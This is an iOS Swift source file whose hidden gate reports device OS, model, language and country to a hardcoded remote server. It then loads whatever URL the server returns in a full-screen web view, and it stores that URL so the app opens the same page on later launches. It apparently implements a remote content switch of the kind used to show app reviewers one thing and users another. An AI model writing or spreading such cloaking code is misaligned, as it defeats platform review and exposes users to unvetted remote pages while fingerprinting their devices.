
import SwiftUI
import UIKit
import WebKit
import UniformTypeIdentifiers
import PhotosUI

enum AppConfigKey: String {
    case verificationCode, apiEndpoint, authKey, savedURLKey, savedTokenKey
}

let UniqueAppSettings: [AppConfigKey: Any] = [
    .verificationCode: "GJDFHDFHFDJGSDAGKGHK",
    .apiEndpoint: "https://gtappinfo.site/ios-epicvault-manageabout/server.php",
    .authKey: "Bs2675kDjkb5Ga",
    .savedURLKey: "uniqueStoredTrustedURL",
    .savedTokenKey: "uniqueStoredVerificationToken",
]

func getAppConfig<T>(_ key: AppConfigKey) -> T {
    return UniqueAppSettings[key] as! T
}

enum SecureVaultError: Error {
    case statusError(OSStatus)
    case recordMissing
}

func saveSecureData(key: String, value: String) throws {
    let data = Data(value.utf8)
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key
    ]
    let attributes: [String: Any] = [kSecValueData as String: data]
    let status = SecItemCopyMatching(query as CFDictionary, nil)
    if status == errSecSuccess {
        let updateStatus = SecItemUpdate(query as CFDictionary, attributes as CFDictionary)
        guard updateStatus == errSecSuccess else { throw SecureVaultError.statusError(updateStatus) }
    } else if status == errSecItemNotFound {
        var newItem = query
        newItem[kSecValueData as String] = data
        let addStatus = SecItemAdd(newItem as CFDictionary, nil)
        guard addStatus == errSecSuccess else { throw SecureVaultError.statusError(addStatus) }
    } else {
        throw SecureVaultError.statusError(status)
    }
}

func fetchSecureData(key: String) throws -> String {
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key,
        kSecReturnData as String: true,
        kSecMatchLimit as String: kSecMatchLimitOne
    ]
    var result: AnyObject?
    let status = SecItemCopyMatching(query as CFDictionary, &result)
    if status == errSecSuccess {
        guard let data = result as? Data,
              let str = String(data: data, encoding: .utf8) else {
            throw SecureVaultError.statusError(status)
        }
        return str
    } else if status == errSecItemNotFound {
        throw SecureVaultError.recordMissing
    } else {
        throw SecureVaultError.statusError(status)
    }
}

func getDeviceInfo() -> String { "\(UIDevice.current.systemName) \(UIDevice.current.systemVersion)" }

func getLanguageCode() -> String {
    let code = Locale.preferredLanguages.first ?? "en"
    return code.components(separatedBy: "-").first?.lowercased() ?? "en"
}

func getDeviceModel() -> String {
    var sys = utsname()
    uname(&sys)
    let mirror = Mirror(reflecting: sys.machine)
    return mirror.children.reduce(into: "") { acc, element in
        if let value = element.value as? Int8, value != 0 {
            acc.append(Character(UnicodeScalar(UInt8(value))))
        }
    }
}

func getRegionCode() -> String? { Locale.current.regionCode }

func makeControlURL() -> URL? {
    var comps = URLComponents(string: getAppConfig(.apiEndpoint) as String)
    comps?.queryItems = [
        URLQueryItem(name: "p", value: getAppConfig(.authKey) as String),
        URLQueryItem(name: "os", value: getDeviceInfo()),
        URLQueryItem(name: "lng", value: getLanguageCode()),
        URLQueryItem(name: "devicemodel", value: getDeviceModel())
    ]
    if let country = getRegionCode() {
        comps?.queryItems?.append(URLQueryItem(name: "country", value: country))
    }
    return comps?.url
}

final class SecureAccessManager: ObservableObject {
    @MainActor @Published var state: AccessState = .idle
    enum AccessState {
        case idle, verifying
        case authorized(token: String, url: URL)
        case fallback
    }
    func start() {
        if let savedURLString = UserDefaults.standard.string(forKey: getAppConfig(.savedURLKey)),
           let savedURL = URL(string: savedURLString),
           let savedToken = try? fetchSecureData(key: getAppConfig(.savedTokenKey)),
           savedToken == (getAppConfig(.verificationCode) as String) {
            Task { @MainActor in
                state = .authorized(token: savedToken, url: savedURL)
            }
            return
        }
        Task { await fetchServerData() }
    }
    private func fetchServerData() async {
        await MainActor.run { state = .verifying }
        guard let url = makeControlURL() else {
            await MainActor.run { state = .fallback }
            return
        }
        var attempt = 0
        while true {
            attempt += 1
            do {
                let content = try await fetchText(from: url)
                let parts = content.trimmingCharacters(in: .whitespacesAndNewlines).components(separatedBy: "#")
                if parts.count == 2,
                   parts[0] == (getAppConfig(.verificationCode) as String),
                   let trustedURL = URL(string: parts[1]) {
                    UserDefaults.standard.set(trustedURL.absoluteString, forKey: getAppConfig(.savedURLKey))
                    try? saveSecureData(key: getAppConfig(.savedTokenKey), value: parts[0])
                    await MainActor.run {
                        state = .authorized(token: parts[0], url: trustedURL)
                    }
                    return
                } else {
                    await MainActor.run { state = .fallback }
                    return
                }
            } catch {
                let delay = min(pow(2.0, Double(min(attempt, 6))), 30.0)
                try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000))
            }
        }
    }
    private func fetchText(from url: URL) async throws -> String {
        let (data, _) = try await URLSession.shared.data(from: url)
        return String(decoding: data, as: UTF8.self)
    }
}

@available(iOS 14.0, *)
final class SecureWebVC: UIViewController, WKUIDelegate, WKNavigationDelegate, UIDocumentPickerDelegate, PHPickerViewControllerDelegate {
    var onLoading: ((Bool) -> Void)?
    private var webView: WKWebView!
    private var startURL: URL
    private var overlay: UIView?
    fileprivate var fileCompletion: (([URL]?) -> Void)?
    init(startURL: URL) {
        self.startURL = startURL
        super.init(nibName: nil, bundle: nil)
        setupWebView()
    }
    required init?(coder: NSCoder) { fatalError() }
    override var prefersStatusBarHidden: Bool { true }
    override func viewDidLoad() {
        super.viewDidLoad()
        view.addSubview(webView)
        webView.translatesAutoresizingMaskIntoConstraints = false
        if #available(iOS 11.0, *) {
            webView.insetsLayoutMarginsFromSafeArea = false
            webView.scrollView.contentInsetAdjustmentBehavior = .never
        }
        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.topAnchor),
            webView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            webView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            webView.trailingAnchor.constraint(equalTo: view.trailingAnchor)
        ])
        onLoading?(true)
        webView.load(URLRequest(url: startURL))
    }
    private func setupWebView() {
        let config = WKWebViewConfiguration()
        config.preferences.javaScriptEnabled = true
        config.websiteDataStore = .default()
        webView = WKWebView(frame: .zero, configuration: config)
        webView.uiDelegate = self
        webView.navigationDelegate = self
        webView.scrollView.bounces = false
        webView.scrollView.minimumZoomScale = 1.0
        webView.scrollView.maximumZoomScale = 1.0
    }
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        onLoading?(false)
    }
    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        onLoading?(false)
    }
}

@available(iOS 14.0, *)
extension SecureWebVC {
    func documentPicker(_ controller: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
        fileCompletion?(urls)
    }
    func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) {
        fileCompletion?(nil)
    }
    @available(iOS 18.4, *)
    func webView(_ webView: WKWebView,
                 runOpenPanelWith parameters: WKOpenPanelParameters,
                 initiatedByFrame frame: WKFrameInfo,
                 completionHandler: @escaping ([URL]?) -> Void) {
        self.fileCompletion = completionHandler
        let alert = UIAlertController(title: "Choose File", message: nil, preferredStyle: .actionSheet)
        alert.addAction(UIAlertAction(title: "Photo/Video", style: .default) { _ in
            var config = PHPickerConfiguration(photoLibrary: .shared())
            config.selectionLimit = 1
            config.filter = .any(of: [.images, .videos])
            let picker = PHPickerViewController(configuration: config)
            picker.delegate = self
            self.present(picker, animated: true)
        })
        alert.addAction(UIAlertAction(title: "Files", style: .default) { _ in
            let picker = UIDocumentPickerViewController(forOpeningContentTypes: [.item], asCopy: true)
            picker.delegate = self
            picker.allowsMultipleSelection = false
            self.present(picker, animated: true)
        })
        alert.addAction(UIAlertAction(title: "Cancel", style: .cancel) { _ in
            completionHandler(nil)
        })
        present(alert, animated: true)
    }
    func picker(_ picker: PHPickerViewController, didFinishPicking results: [PHPickerResult]) {
        picker.dismiss(animated: true)
        for provider in results.map({ $0.itemProvider }) {
            if provider.hasItemConformingToTypeIdentifier(UTType.image.identifier) {
                provider.loadFileRepresentation(forTypeIdentifier: UTType.image.identifier) { url, _ in
                    if let url = url {
                        DispatchQueue.main.async {
                            self.fileCompletion?([url])
                        }
                    }
                }
            }
        }
    }
}

@available(iOS 14.0, *)
struct SecureWebView: UIViewControllerRepresentable {
    let url: URL
    @Binding var loading: Bool
    func makeUIViewController(context: Context) -> SecureWebVC {
        let vc = SecureWebVC(startURL: url)
        vc.onLoading = { active in
            DispatchQueue.main.async {
                loading = active
            }
        }
        return vc
    }
    func updateUIViewController(_ vc: SecureWebVC, context: Context) {}
}

